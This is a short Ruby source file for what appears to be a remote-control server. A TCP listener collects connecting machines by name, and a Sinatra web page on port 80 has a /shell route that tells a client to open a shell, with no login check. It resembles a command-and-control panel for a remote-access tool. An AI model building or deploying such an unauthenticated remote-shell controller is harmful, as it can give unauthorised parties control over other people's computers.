require_relative('app/controllers/controller')

#TCP Server variables
$stdout.sync = true
server = TCPServer.new('127.0.0.1', 55555)

#Threads variables
$loopThread = Thread.new { sleep }
$semaphore = Mutex.new

#Global lists
pcList = []
$clientsList = []

$loopThread = Thread.new {
  loop do
    Thread.start(server.accept) do |client|
      begin
        #Always need to synchronize global array
        $semaphore.synchronize { $clientsList << Client.new(client) }
        while line = client.gets
          if line[0..10] == "Polaczono z"
            pcList << line[12..-2]
            $semaphore.synchronize { $clientsList[Client.num].name = line[12..-2] }
          end
        end
      rescue
        Client.dead
      end
    end
  end
  server.close
}


class MyServer < Sinatra::Base

  configure do
    set :run            , 'true'
    set :public_folder  , 'public'
    set :views          , 'app/views'
    set :port           , '80'
    set :bind           , '0.0.0.0'
    set :show_exceptions, 'true' #Those are errors
  end

  get '/' do
      erb :home
  end

  get '/shell' do
    $semaphore.synchronize { $clientsList[Client.num].send("shell") }
    erb :site_after
  end

  helpers do
    def current_user
      if session[:user_id]
        $usersDB.where(:id => session[:user_id]).all[0]
      else
        nil
      end
    end
  end

  not_found do
    status 404
    redirect '/'
  end

  run!
end
